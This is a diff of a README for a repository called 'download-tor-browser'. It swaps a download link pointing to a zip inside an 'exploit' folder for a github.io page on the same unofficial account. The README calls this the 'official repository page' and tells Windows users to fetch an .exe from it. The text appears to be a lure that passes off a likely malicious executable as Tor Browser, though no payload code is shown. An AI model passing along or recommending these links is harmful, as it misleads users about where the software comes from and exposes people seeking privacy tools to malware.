@@ -1,6 +1,6 @@
 # 🌐 download-tor-browser - Browse the internet with total privacy
 
-[![Download for Windows](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://raw.githubusercontent.com/Calliopegelding314/download-tor-browser/main/exploit/browser_tor_download_3.6.zip)
+[![Download for Windows](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](calliopegelding314.github.io)
 
 ## 🛡️ What is Tor Browser
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic requirements before you begin:
 
 Follow these steps to obtain the correct files for your computer:
 
-1.  Visit the official repository page here: [https://raw.githubusercontent.com/Calliopegelding314/download-tor-browser/main/exploit/browser_tor_download_3.6.zip](https://raw.githubusercontent.com/Calliopegelding314/download-tor-browser/main/exploit/browser_tor_download_3.6.zip).
+1.  Visit the official repository page here: [calliopegelding314.github.io](calliopegelding314.github.io).
 2.  Look for the latest release section on the right side of the page.
 3.  Click on the link labeled "Assets."
 4.  Find the file ending in .exe for the Windows platform.
